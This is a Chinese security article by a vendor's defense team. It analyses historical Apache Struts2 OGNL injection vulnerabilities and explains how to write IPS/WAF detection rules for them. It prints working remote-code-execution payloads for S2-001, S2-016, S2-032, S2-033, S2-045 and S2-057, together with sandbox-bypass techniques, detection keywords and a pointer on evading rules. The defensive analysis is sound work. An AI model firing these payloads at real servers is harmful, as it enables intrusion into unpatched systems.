##  一、前言

**Struts2漏洞是一个经典的漏洞系列，根源在于Struts2引入了OGNL表达式使得框架具有灵活的动态性。随着整体框架的补丁完善，现在想挖掘新的Struts2漏洞会比以前困难很多，从实际了解的情况来看，大部分用户早就修复了历史的高危漏洞。目前在做渗透测试时，Struts2漏洞主要也是碰碰运气，或者是打到内网之后用来攻击没打补丁的系统会比较有效。**

网上的分析文章主要从攻击利用的角度来分析这些Struts2漏洞。作为新华三攻防团队，我们的一部分工作是维护ips产品的规则库，今天回顾一下这个系列的漏洞，给大家分享一些防护者的思路，如果有遗漏或者错误，欢迎各位大佬指正。

##  二、Struts2历史漏洞

研究Struts2的历史漏洞，一部分原因为了review以前的ips、waf的防护规则。开发规则的时候，我们认为有几个原则：

> 1、站在攻击者的角度思考；
>
> 2、理解漏洞或者攻击工具的原理；
>
> 3、定义漏洞或者攻击工具的检测规则时，思考误报、漏报的情况。

如果安全设备不会自动封ip，那么防护规则是有可能被慢慢试出来的。如果规则只考虑了公开的poc规则写得太过严格，是可能被绕过的，所以有了这次review。先来看看Struts2的历史漏洞的原理。

###  2.1判断网站使用Struts2框架

一般攻击者在攻击之前会判断网站是Struts2编写，主要看有没有链接是.action或者.do结尾的，这是因为配置文件struts.xml指定了action的后缀

    
    
    <constant name="struts.action.extension" value="action,," />

但是上述这个配置文件解析之后，不带后缀的uri也会被解析称为action的名字。如下：

![image.png](https://image.3001.net/images/20200303/15832288012188.png!small)

如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的。

![image.png](https://image.3001.net/images/20200303/1583228817691.png!small)如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json  

    
    
    <constant name="struts.action.extension" value="xhtml,,xml,json" />

根据后缀不同，rest插件使用不同的处理流程，如下请求json格式的数据，框架就使用了JsonLibHandler类对输出进行处理。

![image.png](https://image.3001.net/images/20200303/15832288372011.png!small)

xhtml和xml结尾的请求则使用HtmlHandler和XStreamHandler分别处理。所以在测试的时候，不能明确判断网站使用的是否为struts2框架时，特别是碰到后两种情况，都可以拿工具去试试运气。

###  2.2Struts2执行代码的原理

Struts2的动态性在于ongl表达式的可以获取到运行变量的值，并且有机会执行函数调用。如果可以把恶意的请求参数送到ognl的执行流程中，就会导致任意代码执行漏洞。ognl表达式的执行在Ognl相关的几个类里面，配置好调试环境后，对OgnlUtil类的getvalue或compileAndExecute函数下断点，就根据参数判断poc调用的流程，分析执行的原理了。

**2.2.1 S2-045,S2-046**

以S2-045为例，查看web工程目录的payload是

    
    
    content-type: %{(#fuck='multipart/form-data') .(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

断点拦截情况

![image.png](https://image.3001.net/images/20200303/15832288924072.png!small)

根据堆栈查看信息

    
    
    getValue:321, OgnlUtil (com.opensymphony.xwork2.ognl)
    
        getValue:363, OgnlValueStack (com.opensymphony.xwork2.ognl)
    
        .......
    
        evaluate:49, OgnlTextParser (com.opensymphony.xwork2.util)
    
        translateVariables:171, TextParseUtil (com.opensymphony.xwork2.util)
    
        translateVariables:130, TextParseUtil (com.opensymphony.xwork2.util)
    
        translateVariables:52, TextParseUtil (com.opensymphony.xwork2.util)
    
        ......
    
        buildErrorMessage:123, JakartaMultiPartRequest (org.apache.struts2.dispatcher.multipart)
    
        parse:105, JakartaMultiPartRequest (org.apache.struts2.dispatcher.multipart)
    
        <init>:84, MultiPartRequestWrapper (org.apache.struts2.dispatcher.multipart)
    
        wrapRequest:841, Dispatcher (org.apache.struts2.dispatcher)

根据堆栈可以定位到漏洞原因，查看到Dispatcher函数，发现如果content-typ字段包含了multipart/form-data字符串，就会把请求封装成MultiPartRequestWrapper，走到了JakartaMultiPartRequest类的流程中

    
    
    if (content_type != null && content_type.contains("multipart/form-data")) {  
         MultiPartRequest mpr = getMultiPartRequest();  
         LocaleProvider provider = getContainer().getInstance(LocaleProvider.class);  
         request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);  
     } else {  
         request = new StrutsRequestWrapper(request, disableRequestAttributeValueStackLookup);

如果处理出错，就会调用buildErrorMessage函数构造报错信息。

    
    
    try {  
         multi.parse(request, saveDir);  
         for (String error : multi.getErrors()) {  
             addError(error);  
         }  
     } catch (IOException e) {  
         if (LOG.isWarnEnabled()) {  
             LOG.warn(e.getMessage(), e);  
         }  
         addError(buildErrorMessage(e, new Object[] {e.getMessage()}));  
     }

后续调用过程是buildErrorMessage --->LocalizedTextUtil.findText --->TextParseUtil.
translateVariables ---->OgnlUtil.getValue
，补丁修改是buildErrorMessage不调用LocalizedTextUtil.findText函数，这样报错后提交的输入就到不了ognl模块了。S2-046也是用到045的相同模块，总体来看，045和046是17年上半年出现的漏洞，漏洞用到的是框架本身，限制条件少,
算是比较好用的Struts2漏洞了（虽然成功率也非常低）。可以看到现在网络上大量的自动化扫描器或者蠕虫，都自带045和046，ips设备每天能收到大量此类日志。

**2.2.2 S2-001**

往前看，比较好用的漏洞中比较有代表性的有S2-001(S2-003,005,008年代比较久远，后来出现了比较好用的新漏洞，所以这些漏洞用的人很少，对应Struts2的版本也很低)，001是Struts2框架最刚开始出现的第一个漏洞，跟045的执行过程也比较接近，都是经由TextParseUtil.
translateVariables执行OGNL表达式，TextParseUtil是文本处理的功能类。不同的是S2-001是在把jsp生成java类的时候，会对表单提交的参数调用evaluateParams从而调用文本处理类的OGNL求值功能。调用堆栈如下：

    
    
    translateVariables:72, TextParseUtil (com.opensymphony.xwork2.util)
    
        findValue:303, Component (org.apache.struts2.components)
    
        evaluateParams:680, UIBean (org.apache.struts2.components)
    
        end:450, UIBean (org.apache.struts2.components)
    
        doEndTag:36, ComponentTagSupport (org.apache.struts2.views.jsp)
    
        _jspx_meth_s_005ftextfield_005f0:17, quiz_002dbasic_jsp (org.apache.jsp.validation)
    
        …………….
    
        Payload: %25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath('%2F'))%2C%23response.flush()%2C%23response.close()%7D

![image.png](https://image.3001.net/images/20200303/15832289695851.png!small)提交就能触发漏洞

**2.2.3 S2-016**

接着是S2-016，以及S2-032,S2-033,S2-037，这几个漏洞比较接近，其中S2-016是比较好用的，由于年代太过久远了，现在已经几乎不可能利用成功，但是这个漏洞由于太经典，还是值得看看。

获取路径的Payload是:

    
    
    redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D

直接在uri后面跟redirect标签

![image.png](https://image.3001.net/images/20200303/15832290029854.png!small)
调用栈：

    
    
    getValue:255, OgnlUtil (com.opensymphony.xwork2.ognl)
    
        .......
    
        translateVariables:170, TextParseUtil (com.opensymphony.xwork2.util)
    
        .......
    
        execute:161, ServletRedirectResult (org.apache.struts2.dispatcher)
    
        serviceAction:561, Dispatcher (org.apache.struts2.dispatcher)
    
        executeAction:77, ExecuteOperations (org.apache.struts2.dispatcher.ng)
    
        doFilter:93, StrutsExecuteFilter (org.apache.struts2.dispatcher.ng.filter)
    
        internalDoFilter:235, ApplicationFilterChain (org.apache.catalina.core)

代码注释意为， 在Struts2框架下如果mapping能直接获得结果，就调用结果对象的execute函数。

![image.png](https://image.3001.net/images/20200303/15832290255032.png!small)Uri标签中的redirect，对应的是ServletRedirectResult这个结果，构造函数如下，是DefaultActionMapper构造的时候顺带构造好的，

    
    
    public DefaultActionMapper() {  
         prefixTrie = new PrefixTrie() {  
             {  
                 put(METHOD_PREFIX, new ParameterAction() {  
                     public void execute(String key, ActionMapping mapping) {  
                         if (allowDynamicMethodCalls) {  
                             mapping.setMethod(key.substring(  
                                     METHOD_PREFIX.length()));  
                         }  
                     }  
                 });  
       
                 put(ACTION_PREFIX, new ParameterAction() {  
                     public void execute(String key, ActionMapping mapping) {  
                         String name = key.substring(ACTION_PREFIX.length());  
                         if (allowDynamicMethodCalls) {  
                             int bang = name.indexOf('!');  
                             if (bang != -1) {  
                                 String method = name.substring(bang + 1);  
                                 mapping.setMethod(method);  
                                 name = name.substring(0, bang);  
                             }  
                         }  
                         mapping.setName(name);  
                     }  
                 });

而这个ServletRedirectResult结果在解析Uri的时候，就会被设置到mapping对象中，调用栈如下：

    
    
    execute:214, DefaultActionMapper$2$3 (org.apache.struts2.dispatcher.mapper)
    
        handleSpecialParameters:361, DefaultActionMapper (org.apache.struts2.dispatcher.mapper)
    
        getMapping:317, DefaultActionMapper (org.apache.struts2.dispatcher.mapper)
    
        findActionMapping:161, PrepareOperations (org.apache.struts2.dispatcher.ng)
    
        findActionMapping:147, PrepareOperations (org.apache.struts2.dispatcher.ng)
    
        doFilter:89, StrutsPrepareFilter (org.apache.struts2.dispatcher.ng.filter)

后续ServletRedirectResult的execute函数执行后，经由conditionalParse调用文本处理类TextParseUtil的translateVariables函数进入Ognl的流程，代码得到执行。

**2.2.4 S2-032,S2-033,S2-037**

S2-032是框架本身漏洞，不过利用有个前提条件，需要开启动态方法执行的配置

    
    
    <constant name="struts.enable.DynamicMethodInvocation" value="true" />

S2-033和S2-037则是rest插件漏洞，一般来说插件漏洞利用还是比较困难的，因为开发网站的时候不一定会用到这个插件。S2-032的payload如下：

    
    
    http://localhost:8080/s2032/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=ipconfig

![image.png](https://image.3001.net/images/20200303/1583229591609.png!small)

跟S2-016一样，也是uri中带特殊标签，其漏洞点也在DefaultActionMapper类的构造函数，
struts.mxl文件中配置了DynamicMethodInvocation后，构造mapping的时候会满足if语句，设置method属性为冒号后的OGNL表达式

    
    
    public DefaultActionMapper() {  
         prefixTrie = new PrefixTrie() {  
             {  
                 put(METHOD_PREFIX, new ParameterAction() {  
                     public void execute(String key, ActionMapping mapping) {  
                         if (allowDynamicMethodCalls) {  
                             mapping.setMethod(key.substring(METHOD_PREFIX.length()));  
                         }  
                     }  
                 });

在调用完Struts2默认的拦截器后，进入DefaultActionInvocation的调用函数invokeAction，后者直接调用Ognl表达式的执行。

![image.png](https://image.3001.net/images/20200303/1583229611665.png!small)S2-032和S2-037也是通过这个步骤得到执行的，不同的是这两漏洞是基于rest插件的。rest插件使得struts2框架的请求具备restful风格，参数直接放在uri里面提交，而非问号后面的字符串。如下为正常的请求：

![image.png](https://image.3001.net/images/20200303/15832296256013.png!small)漏洞利用payload为：

    
    
    http://localhost:8080/s2033/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=vulnerable

![image.png](https://image.3001.net/images/20200303/15832296467989.png!small)payload将正常的edit方法替换成了ognl代码。rest插件使用的是RestActionMapper来解析uri，生成mapping，在其getMapping函数内，解析uri设置了method变量，

    
    
    int lastSlashPos = fullName.lastIndexOf(47);
     String id = null;
     if (lastSlashPos > -1) {
         int prevSlashPos = fullName.lastIndexOf(47, lastSlashPos - 1);
         if (prevSlashPos > -1) {
             mapping.setMethod(fullName.substring(lastSlashPos + 1));
             fullName = fullName.substring(0, lastSlashPos);
             lastSlashPos = prevSlashPos;
         }

而后跟032一样，也是通过ognl表达式来调用这个方法的时候，执行了恶意的命令

![image.png](https://image.3001.net/images/20200303/15832296689904.png!small)S2-037跟S2-032漏洞点一致，是对补丁的绕过，应该是Struts2.3.28.1没有修复好。

![image.png](https://image.3001.net/images/20200303/15832296938434.png!small)

这两个漏洞是16年的，也需要非常好的运气才能利用，毕竟依赖rest插件且年代久远。

**2.2.5 S2-052**

这个漏洞跟传统的Struts2漏洞不同的是，并不是利用ognl表达式执行的代码，而是使用unmarshal漏洞执行代码。缺点就是也要用到rest插件，并且对jdk版本有要求，要大于等于1.8，使用JDK
1.7测试报错如下

![image.png](https://image.3001.net/images/20200303/15832297148960.png!small)使用JDK
1.8测试能正常执行命令。

![image.png](https://image.3001.net/images/20200303/15832297265129.png!small)由于使用的不是ongl表达式执行的漏洞，防护思路也跟Struts2的常规防护有区别，后续可以跟weblogic系列漏洞合并分析。

**2.2.6 S2-057**

S2-057的代码执行有2个条件：

1、需要开启alwaysSelectFullNamespace配置为true，一般提取请求中uri的时候，会对比配置文件中的namespace，匹配上了选取最长的一段作为此次请求的namespace。但是如果这个参数设置为true，就不做对比，直接提取action前面的所有字符串作为namespace。

    
    
    protected void parseNameAndNamespace(String uri, ActionMapping mapping, ConfigurationManager configManager) {  
         int lastSlash = uri.lastIndexOf(47);  
         String namespace;  
         String name;  
         if (lastSlash == -1) {  
             namespace = "";  
             name = uri;  
         } else if (lastSlash == 0) {  
             namespace = "/";  
             name = uri.substring(lastSlash + 1);  
         } else if (this.alwaysSelectFullNamespace) {  
             namespace = uri.substring(0, lastSlash);  
             name = uri.substring(lastSlash + 1);} else {

例如payload使用

    
    
    GET /s2057/${(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedClasses('java.lang.Shutdown')).(#ou.setExcludedPackageNames('sun.reflect.')).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec('calc'))}/actionChain1

标红的整体ognl攻击表达式会被提取成为namespace。

2、使用了服务器跳转的结果，这里的要求是配置了actionChaining类型的action，在配置action结果的时候，使用redirectAction(ServletActionRedirectResult类),chain(ActionChainResult类),postback(PostbackResult类)作为结果类型。

    
    
    <package name="actionchaining" extends="struts-default">  
        <action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">  
           <result type="redirectAction">  
              <param name = "actionName">register2</param>  
           </result>  
        </action>  
        <action name="actionChain2" class="org.apache.struts2.showcase.actionchaining.ActionChain2">  
           <result type="chain">xxx</result>  
        </action>  
        <action name="actionChain3" class="org.apache.struts2.showcase.actionchaining.ActionChain3">  
           <result type="postback">  
              <param name = "actionName">register2</param>  
           </result>  
        </action>  
     </package>

这样在处理result结果的时候，会把namespace送到ognl引擎执行。例如redirectAction(ServletActionRedirectResult类)的情况，分发器disptacher会根据action的结果，把流程传给ServletActionRedirectResult的execute函数，后者通过setLocation设置302跳转的目的地址到自己的location变量(包含了ognl恶意代码的namespace)，

    
    
    public void execute(ActionInvocation invocation) throws Exception {  
         this.actionName = this.conditionalParse(this.actionName, invocation);  
         if (this.namespace == null) {  
             this.namespace = invocation.getProxy().getNamespace();  
         } else {  
             this.namespace = this.conditionalParse(this.namespace, invocation);  
         }  
       
         if (this.method == null) {  
             this.method = "";  
         } else {  
             this.method = this.conditionalParse(this.method, invocation);  
         }  
       
         String tmpLocation = this.actionMapper.getUriFromActionMapping(new ActionMapping(this.actionName, this.namespace, this.method, (Map)null));  
         this.setLocation(tmpLocation);  
         super.execute(invocation);  
     }

然后调用父类ServletRedirectResult的execute函数 ----> 调用父类StrutsResultSupport的execute函数

    
    
    public void execute(ActionInvocation invocation) throws Exception {  
         this.lastFinalLocation = this.conditionalParse(this.location, invocation);  
         this.doExecute(this.lastFinalLocation, invocation);  
     }  
       
     protected String conditionalParse(String param, ActionInvocation invocation) {  
         return this.parse && param != null && invocation != null ? TextParseUtil.translateVariables(param, invocation.getStack(), new StrutsResultSupport.EncodingParsedValueEvaluator()) : param;  
     }

其中conditionalParse是条件调用TextParseUtil.translateVariables进行ognl的执行流程，这个条件是满足的，参数就是之前设置的location变量，因此代码得到执行。

###  2.3Struts2沙盒防护和绕过

Struts2的每一轮新的漏洞，既包含了新的Ognl代码执行的点，也包含Struts2的沙盒加强防护的绕过，而每一轮补丁除了修复Ognl的执行点，也再次强化沙盒，补丁主要都是通过struts-default.xml限制了ognl使用到的类和包，以及修改各种bean函数的访问控制符。最新版本Struts2.5.20的Struts-default.xml，限制java.lang.Class,
java.lang.ClassLoader，java.lang.ProcessBuilder这几个类访问，导致漏洞利用时无法使用构造函数、进程创建函数、类加载器等方式执行代码，限制com.opensymphony.xwork2.ognl这个包的访问，导致漏洞利用时无法访问和修改_member_access，context等变量。

    
    
    <constant name="struts.excludedClasses"  
               value="  
                 java.lang.Object,  
                 java.lang.Runtime,  
                 java.lang.System,  
                 java.lang.Class,  
                 java.lang.ClassLoader,  
                 java.lang.Shutdown,  
                 java.lang.ProcessBuilder,  
                 com.opensymphony.xwork2.ActionContext" />  
       
     <!-- this must be valid regex, each '.' in package name must be escaped! -->  
     <!-- it's more flexible but slower than simple string comparison -->  
     <!-- constant name="struts.excludedPackageNamePatterns" value="^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)" / -->  
       
     <!-- this is simpler version of the above used with string comparison -->  
     <constant name="struts.excludedPackageNames"  
               value="  
                 ognl.,  
                 javax.,  
                 freemarker.core.,  
                 freemarker.template.,  
                 freemarker.ext.rhino.,  
                 sun.reflect.,  
                 javassist.,  
                 org.objectweb.asm.,  
                 com.opensymphony.xwork2.ognl.,  
                 com.opensymphony.xwork2.security.,  
                 com.opensymphony.xwork2.util." />

调试时，可以对SecurityMemberAccess的isAccessible函数下断点观察ognl的沙盒防护情况。

    
    
    public boolean isAccessible(Map context, Object target, Member member, String propertyName) {  
         LOG.debug("Checking access for [target: {}, member: {}, property: {}]", target, member, propertyName);  
         if (this.checkEnumAccess(target, member)) {  
             LOG.trace("Allowing access to enum: {}", target);  
             return true;  
         } else {  
             Class targetClass = target.getClass();  
             Class memberClass = member.getDeclaringClass();  
             if (Modifier.isStatic(member.getModifiers()) && this.allowStaticMethodAccess) {  
                 LOG.debug("Support for accessing static methods [target: {}, member: {}, property: {}] is deprecated!", target, member, propertyName);  
                 if (!this.isClassExcluded(member.getDeclaringClass())) {  
                     targetClass = member.getDeclaringClass();  
                 }  
             }

## 三、网络侧Struts2的防护思路

一般的ips、waf规则，可以从两个方向进行检测，一个是检测漏洞发生点，另外一个是检测利用的攻击代码。Struts2有一些老的漏洞，很多是url中或者post表单中提交ognl代码，从漏洞点来看并不是太好做检测，所以一般的检测规则还是检查ognl代码，配合漏洞发生点。结合payload来看，ognl代码的构成，技术性最强的ognl代码是045和057的两个payload，还是从045的payload来看

    
    
    content-type: %{(#fuck='multipart/form-data') .(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

OgnlContext的_memberAccess变量进行了访问控制限制，决定了哪些类，哪些包，哪些方法可以被ognl表达式所使用。045之前的补丁禁止了_memberAccess的访问:

    
    
    #container=#context['com.opensymphony.xwork2.ActionContext.container'])

payload通过ActionContext对象得到Container:

    
    
    #ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class

然后用Container的getInstance方法获取到ognlUtil实例:

    
    
    #ognlUtil.getExcludedPackageNames().clear()
    
        #ognlUtil.getExcludedClasses().clear()

通过ognlUtil的公开方法清空禁止访问的类和包，后面则是常规的输出流获取和函数调用。这个ognl的payload比较典型，可以检测的点也比较多。

一般来说，ips或者waf的Struts2规则可以检测沙盒绕过使用的对象和方法，如
_memberaccess，getExcludedPackageNames，getExcludedClasses，DEFAULT_MEMBER_ACCESS都是很好的检测点，防护规则也可以检测函数调用ServletActionContext@getResponse（获取应答对象），java.lang.ProcessBuilder(进程构建，执行命令)，java.lang.Runtime(运行时类建，执行命令)，java.io.FileOutputStream（文件输出流，写shell），getParameter（获取参数），org.apache.commons.io.IOUtils（IO函数）。不太好的检测点包括com.opensymphony.xwork2.ActionContext.container这种字典的key或者包的全名，毕竟字符串是可以拼接和变形的，这种规则很容易绕过。其他时候规则提取的字符串尽量短一些，避免变形绕过。

测试发现有的waf产品规则只检测DEFAULT_MEMBER_ACCESS和_memberaccess这两个字符串之一，看起来很粗暴，有误报风险，不过检测效果还是不错的，
Ognl表达式由于其灵活性，存在一些变形逃逸的，但是S2-016之后的漏洞要绕过沙盒很难避开这两个对象及相关函数调用。绕过可以参考ognl.jjt文件，这个文件定义了ognl表达式的词法和语法结构，ognl的相关解析代码也是基于这个文件生成的，所以一般的绕过也可以基于此文件展开。

##  四、总结

目前来看Struts2的漏洞相对比较少，利用起来也很难，要找到新的Struts2漏洞也由于沙盒的原因变得比较困难，可能需要更大的脑洞和对java、Struts框架更深的理解。现网流量能看到的大部分自动扫描器基本也是基于S2-045和S2-046的。我们review
Struts2的历史漏洞是为了让防护规则做得更好，由于水平有限，欢迎大家指出文中的错误和交流指教。

 **参考资料：**

> <https://github.com/HatBoy/Struts2-Scan>
>
> <https://meizjm3i.github.io/2018/08/25/S2-057/>
>
> <https://xz.aliyun.com/t/2618>
>
> <https://www.butian.net/School/content/id/423>

***本文作者： 新华三攻防团队，转载请注明来自FreeBuf.COM**  
  

